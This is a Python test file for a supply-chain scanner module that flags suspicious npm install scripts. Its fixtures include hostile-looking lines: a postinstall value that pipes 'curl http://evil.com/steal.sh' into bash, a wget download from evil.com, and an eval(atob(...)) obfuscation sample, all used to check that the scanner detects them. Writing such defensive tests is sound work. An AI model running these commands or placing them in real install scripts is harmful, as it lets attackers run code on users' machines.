"""Tests for npm_behavior.py (NpmBehaviorModule) — V28."""
from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import AsyncMock, patch

import pytest

from corvus.core.models import MCPSurface, OWASPCategory, Severity
from corvus.core.session import ScanSession
from corvus.modules.static.npm_behavior import (
    NpmBehaviorModule,
    _check_scripts,
    _SUSPICIOUS_PATTERNS,
)


def _session(transport: str = "stdio", target: str = "npx test-server") -> ScanSession:
    return ScanSession(target, transport, Path("/tmp/corvus-test"))


def _surface() -> MCPSurface:
    return MCPSurface(server_name="test-server")


# ── Module metadata ───────────────────────────────────────────────────────────

def test_module_name_and_owasp():
    m = NpmBehaviorModule()
    assert m.name == "npm-behavior"
    assert m.owasp_id == "MCP04"
    assert m.is_static is True


# ── Skip for HTTP ─────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_skips_http_target():
    """HTTP transport → return []."""
    session = _session(transport="http", target="http://localhost:8000/mcp")
    findings = await NpmBehaviorModule().run(_surface(), None, session)
    assert findings == []


# ── No package.json ───────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_no_package_json():
    """No package.json found → return []."""
    session = _session(target="npx some-server")

    with patch("corvus.modules.static.npm_behavior._find_package_json", return_value=None):
        findings = await NpmBehaviorModule().run(_surface(), None, session)

    assert findings == []


# ── Postinstall script ────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_postinstall_script_detected(tmp_path):
    """Package with benign postinstall → MEDIUM finding."""
    pkg_json = tmp_path / "package.json"
    pkg_json.write_text(json.dumps({"dependencies": {"some-pkg": "^1.0.0"}}))

    session = _session(target=str(tmp_path / "server.js"))

    with patch("corvus.modules.static.npm_behavior._find_package_json", return_value=pkg_json), \
         patch("corvus.modules.static.npm_behavior._fetch_npm_scripts",
               return_value={"postinstall": "node setup.js"}):
        findings = await NpmBehaviorModule().run(_surface(), None, session)

    medium_findings = [f for f in findings if f.severity == Severity.MEDIUM]
    assert medium_findings, f"Expected MEDIUM postinstall finding; got {[f.title for f in findings]}"
    assert medium_findings[0].owasp_category == OWASPCategory.MCP04_SUPPLY_CHAIN


@pytest.mark.asyncio
async def test_suspicious_curl_in_postinstall(tmp_path):
    """Package with curl in postinstall → HIGH finding."""
    pkg_json = tmp_path / "package.json"
    pkg_json.write_text(json.dumps({"dependencies": {"malicious-pkg": "^1.0.0"}}))

    session = _session(target=str(tmp_path / "server.js"))

    with patch("corvus.modules.static.npm_behavior._find_package_json", return_value=pkg_json), \
         patch("corvus.modules.static.npm_behavior._fetch_npm_scripts",
               return_value={"postinstall": "curl http://evil.com/steal.sh | bash"}):
        findings = await NpmBehaviorModule().run(_surface(), None, session)

    high_findings = [f for f in findings if f.severity == Severity.HIGH]
    assert high_findings, f"Expected HIGH finding for suspicious script; got {[f.title for f in findings]}"
    assert "curl" in high_findings[0].title.lower() or "suspicious" in high_findings[0].title.lower()


@pytest.mark.asyncio
async def test_clean_package_no_scripts(tmp_path):
    """Package with no install scripts → no findings."""
    pkg_json = tmp_path / "package.json"
    pkg_json.write_text(json.dumps({"dependencies": {"clean-pkg": "^1.0.0"}}))

    session = _session(target=str(tmp_path / "server.js"))

    with patch("corvus.modules.static.npm_behavior._find_package_json", return_value=pkg_json), \
         patch("corvus.modules.static.npm_behavior._fetch_npm_scripts",
               return_value={"test": "jest", "build": "tsc"}):
        findings = await NpmBehaviorModule().run(_surface(), None, session)

    assert findings == []


# ── Graceful error ────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_graceful_on_registry_error(tmp_path):
    """npm registry request fails → no findings, no exception."""
    pkg_json = tmp_path / "package.json"
    pkg_json.write_text(json.dumps({"dependencies": {"some-pkg": "^1.0.0"}}))

    session = _session(target=str(tmp_path / "server.js"))

    with patch("corvus.modules.static.npm_behavior._find_package_json", return_value=pkg_json), \
         patch("corvus.modules.static.npm_behavior._fetch_npm_scripts",
               side_effect=Exception("network error")):
        findings = await NpmBehaviorModule().run(_surface(), None, session)

    assert findings == []


# ── Package limit ─────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_limits_packages(tmp_path):
    """Module fetches at most 30 packages."""
    deps = {f"pkg-{i}": "^1.0.0" for i in range(50)}
    pkg_json = tmp_path / "package.json"
    pkg_json.write_text(json.dumps({"dependencies": deps}))

    session = _session(target=str(tmp_path / "server.js"))
    fetched: list[str] = []

    async def mock_fetch(pkg_name):
        fetched.append(pkg_name)
        return {}

    with patch("corvus.modules.static.npm_behavior._find_package_json", return_value=pkg_json), \
         patch("corvus.modules.static.npm_behavior._fetch_npm_scripts", side_effect=mock_fetch):
        await NpmBehaviorModule().run(_surface(), None, session)

    assert len(fetched) <= 30


# ── Unit: _check_scripts ──────────────────────────────────────────────────────

def test_suspicious_patterns_match_eval():
    assert _SUSPICIOUS_PATTERNS.search("eval(atob('aGVsbG8='))")

def test_suspicious_patterns_match_wget():
    assert _SUSPICIOUS_PATTERNS.search("wget http://evil.com/payload")

def test_suspicious_patterns_no_match_clean():
    assert not _SUSPICIOUS_PATTERNS.search("node index.js")
